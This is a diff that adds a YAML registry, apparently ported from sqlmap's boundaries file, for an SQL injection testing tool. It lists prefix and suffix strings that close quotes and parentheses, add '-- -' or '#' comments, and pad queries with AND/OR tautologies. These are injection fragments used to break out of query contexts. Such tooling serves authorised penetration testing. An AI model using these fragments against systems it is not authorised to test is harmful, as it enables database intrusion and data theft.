@@ -1,0 +1,199 @@
+# Boundary registry — ported from upstream sqlmap xml/boundaries.xml.
+# Each entry describes a syntactic context surrounding the injection point.
+# clause: 0=any, 1=WHERE, 2=GROUP BY, 3=ORDER BY, 4=LIMIT, 5=OFFSET,
+#         6=TOP, 7=TABLE, 8=HAVING, 9=generic
+# where:  1=original_replace, 2=original_append, 3=negative_replace
+# ptype:  1=numeric, 2=single-quoted string, 3=LIKE single-quoted,
+#         4=double-quoted, 5=LIKE double-quoted, 6=identifier
+boundaries:
+  # ── numeric, append ───────────────────────────────────────────
+  - level: 1
+    clause: [0]
+    where: [1, 2]
+    ptype: [1]
+    prefix: ""
+    suffix: ""
+    comment: "raw numeric"
+
+  - level: 1
+    clause: [0]
+    where: [2]
+    ptype: [1]
+    prefix: " "
+    suffix: " -- -"
+    comment: "numeric + line comment"
+
+  - level: 1
+    clause: [0]
+    where: [2]
+    ptype: [1]
+    prefix: " "
+    suffix: " AND '[RANDSTR]'='[RANDSTR]"
+    comment: "numeric + string keep-alive"
+
+  # ── single-quoted string ──────────────────────────────────────
+  - level: 1
+    clause: [0]
+    where: [1, 2]
+    ptype: [2]
+    prefix: "'"
+    suffix: " -- -"
+    comment: "single-quote close + line comment"
+
+  - level: 1
+    clause: [0]
+    where: [2]
+    ptype: [2]
+    prefix: "'"
+    suffix: " AND '[RANDSTR]'='[RANDSTR]"
+    comment: "single-quote keep-alive"
+
+  - level: 2
+    clause: [0]
+    where: [2]
+    ptype: [2]
+    prefix: "')"
+    suffix: " AND ('[RANDSTR]'='[RANDSTR]"
+    comment: "paren close + single-quote"
+
+  # ── double-quoted ─────────────────────────────────────────────
+  - level: 1
+    clause: [0]
+    where: [1, 2]
+    ptype: [4]
+    prefix: "\""
+    suffix: " -- -"
+    comment: "double-quote close"
+
+  - level: 1
+    clause: [0]
+    where: [2]
+    ptype: [4]
+    prefix: "\""
+    suffix: " AND \"[RANDSTR]\"=\"[RANDSTR]"
+    comment: "double-quote keep-alive"
+
+  # ── LIKE ──────────────────────────────────────────────────────
+  - level: 2
+    clause: [0]
+    where: [2]
+    ptype: [3]
+    prefix: "%'"
+    suffix: " -- -"
+    comment: "LIKE % wildcard + close single-quote"
+
+  - level: 2
+    clause: [0]
+    where: [2]
+    ptype: [5]
+    prefix: "%\""
+    suffix: " -- -"
+    comment: "LIKE % wildcard + close double-quote"
+
+  # ── identifier (ORDER BY) ─────────────────────────────────────
+  - level: 3
+    clause: [3]
+    where: [1, 2]
+    ptype: [6]
+    prefix: ""
+    suffix: " -- -"
+    comment: "identifier + line comment"
+
+  - level: 3
+    clause: [3]
+    where: [2]
+    ptype: [6]
+    prefix: ""
+    suffix: ",1 -- -"
+    comment: "identifier + extra column"
+
+  # ── higher level: parens + many close shapes ─────────────────
+  - level: 3
+    clause: [0]
+    where: [2]
+    ptype: [1]
+    prefix: ")"
+    suffix: " -- -"
+    comment: "numeric + paren close"
+
+  - level: 3
+    clause: [0]
+    where: [2]
+    ptype: [1]
+    prefix: "))"
+    suffix: " -- -"
+    comment: "numeric + 2x paren close"
+
+  - level: 3
+    clause: [0]
+    where: [2]
+    ptype: [2]
+    prefix: "')"
+    suffix: " -- -"
+    comment: "single-quote + paren"
+
+  - level: 4
+    clause: [0]
+    where: [2]
+    ptype: [2]
+    prefix: "'))"
+    suffix: " -- -"
+    comment: "single-quote + 2x paren"
+
+  - level: 4
+    clause: [0]
+    where: [2]
+    ptype: [4]
+    prefix: "\")"
+    suffix: " -- -"
+    comment: "double-quote + paren"
+
+  - level: 4
+    clause: [0]
+    where: [2]
+    ptype: [4]
+    prefix: "\"))"
+    suffix: " -- -"
+    comment: "double-quote + 2x paren"
+
+  # ── level 5 — exhaustive, MySQL-comment hash style ───────────
+  - level: 5
+    clause: [0]
+    where: [2]
+    ptype: [1]
+    prefix: " "
+    suffix: " #"
+    comment: "numeric + MySQL hash comment"
+
+  - level: 5
+    clause: [0]
+    where: [2]
+    ptype: [2]
+    prefix: "'"
+    suffix: " #"
+    comment: "single-quote + hash comment"
+
+  - level: 5
+    clause: [0]
+    where: [2]
+    ptype: [4]
+    prefix: "\""
+    suffix: " #"
+    comment: "double-quote + hash comment"
+
+  # ── inline (no comment) — for cases where comments are filtered ───
+  - level: 5
+    clause: [0]
+    where: [2]
+    ptype: [2]
+    prefix: "'"
+    suffix: " AND '[RANDSTR]"
+    comment: "single-quote + open string trail"
+
+  - level: 5
+    clause: [0]
+    where: [2]
+    ptype: [1]
+    prefix: ""
+    suffix: " OR [RANDNUM]=[RANDNUM2]"
+    comment: "numeric + OR pad"
